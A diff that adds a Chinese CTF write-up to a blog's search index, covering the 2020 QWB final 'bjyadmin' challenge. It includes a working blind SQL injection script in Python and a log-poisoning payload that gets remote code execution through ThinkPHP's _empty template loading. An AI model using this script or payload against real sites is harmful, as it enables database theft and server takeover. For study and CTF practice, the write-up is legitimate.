@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>2020-QWB-final-bjyadmin</title>
+      <link href="2020/09/21/2020-QWB-final-bjyadmin/"/>
+      <url>2020/09/21/2020-QWB-final-bjyadmin/</url>
+      
+        <content type="html"><![CDATA[<h1 id="2020-QWB-final-bjyadmin"><a href="#2020-QWB-final-bjyadmin" class="headerlink" title="2020-QWB-final-bjyadmin"></a>2020-QWB-final-bjyadmin</h1><h2 id="第一步sql注入"><a href="#第一步sql注入" class="headerlink" title="第一步sql注入"></a>第一步sql注入</h2><blockquote><p>选手使用攻击机利用靶机中的sql注入漏洞获取bjyadmin框架路径</p></blockquote><pre><code># mysql&gt; select info from PROCESSLIST;# +------------------------------+# | info                         |# +------------------------------+# | select info from PROCESSLIST |# +------------------------------+# 1 row in set (0.00 sec)</code></pre><p>利用processlist注出字段名，<a href="https://dev.mysql.com/doc/refman/8.0/en/performance-schema-processlist-table.html" target="_blank" rel="noopener">相关的介绍</a></p><pre><code class="python">import requestsimport timeip=&quot;192.168.10.110&quot;#http://101.133.129.243/def inj(pos,guess):    # true: real-guess &lt; 0    # false : guess &lt;= real    burp0_url = &quot;http://&quot;+ip+&quot;/?id=1&#39;/(if(floor((SELECT(ord(right(left(group_concat(info),{POS}),1)))FROM(information_schema.PROCESSLIST))/{GUESS}),1,0))/&#39;1&quot;.format(POS=pos,GUESS=guess)    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    r=requests.get(burp0_url, headers=burp0_headers,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})    if &quot;Undefined variable: rows in&quot; in r.text:        return True    return False# &quot;http://101.133.129.243:80/?id=1&#39;/(if(floor((SELECT(ord(right(left(group_concat(schema_name),{POS}),1)))FROM(information_schema.schemata))/{GUESS}),1,0))/&#39;1&quot;# database:2020qwbctf # table_name:result=&quot;&quot;pos=len(result)+1while True:    min=32    max=128    print(result)    while True:        #time.sleep(1)        avr = int((min+max)/2)        print(avr)        if not inj(pos,avr):            if inj(pos,avr+1):                result+=chr(avr)                break            else:                min=avr        else:            max=avr        if max-min == 1:            if not inj(pos,min):                result+=chr(max)            else:                result+=chr(min)            break    pos+=1</code></pre><h2 id="bjyadmin"><a href="#bjyadmin" class="headerlink" title="bjyadmin"></a>bjyadmin</h2><p>题目提供的附件和</p><p><a href="https://github.com/baijunyao/thinkphp-bjyadmin" target="_blank" rel="noopener">https://github.com/baijunyao/thinkphp-bjyadmin</a></p><p>一摸一样</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200921120236.png" alt="image2362"></p><p>挨个看过去发现有一个容易令人忽略的漏洞（sxgg一眼看出来）</p><pre><code class="php">&lt;?phpnamespace Home\Controller;use Common\Controller\HomeBaseController;/** * Vue示例 */class VueController extends HomeBaseController{    /**     * 拦截空方法 自动加载html     * @param  string $methed_name 空方法     */    public function _empty($methed_name){        $this-&gt;display($methed_name);        exit(0);    }    /**     * 配合thinkphp分页示例     */    public function page(){        // 获取总条数        $count=M(&#39;Province_city_area&#39;)-&gt;count();        // 每页多少条数据        $limit=200;        $page=new \Org\Nx\Page($count,$limit);        $data=M(&#39;Province_city_area&#39;)            -&gt;limit($page-&gt;firstRow.&#39;,&#39;.$page-&gt;listRows)            -&gt;select();        echo json_encode($data);    }}</code></pre><blockquote><h1 id="ThinkPHP-Action中的-empty方法"><a href="#ThinkPHP-Action中的-empty方法" class="headerlink" title="ThinkPHP Action中的_empty方法"></a>ThinkPHP Action中的_empty方法</h1><p>_empty方法即空操作，当找不到请求的方法时，默认执行该方法，利用这个机制，我们可以实现错误页面和一些URL的优化。</p><pre><code>public function _empty($name){   echo $name;}</code></pre><p>参数name,即请求的方法名。如<a href="http://localhost/waimai/index.php/Index/sdfewsdf,不存在sdfewsdf方法时，会调用_empty方法，显示sdfewsdf" target="_blank" rel="noopener">http://localhost/waimai/index.php/Index/sdfewsdf,不存在sdfewsdf方法时，会调用_empty方法，显示sdfewsdf</a>.</p></blockquote><p>当我们调用一个不存在的action时，它会<code>display ($method)</code> ，这将会造成任意模板调用</p><p>我们利用<code>index.php?m=Home&amp;c=Vue&amp;a=evil_path</code>来调用任意模板，我们可以利用日志文件作为模板文件从而RCE</p><p>最后的payload:</p><pre><code>index.php/Home.php?m=Home&amp;c=Vue&amp;a=Runtime/Logs/User/20_09_17.logindex.php/Home/Vue/web_page&amp;content=&lt;?php/**/phpinfo();</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/09/21/2020-QWB-final-bjyadmin/">http://blog.ccreater.top/2020/09/21/2020-QWB-final-bjyadmin/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 比赛 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> web </tag>
+            
+            <tag> wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>羊城杯2020</title>
       <link href="2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/"/>
       <url>2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/</url>
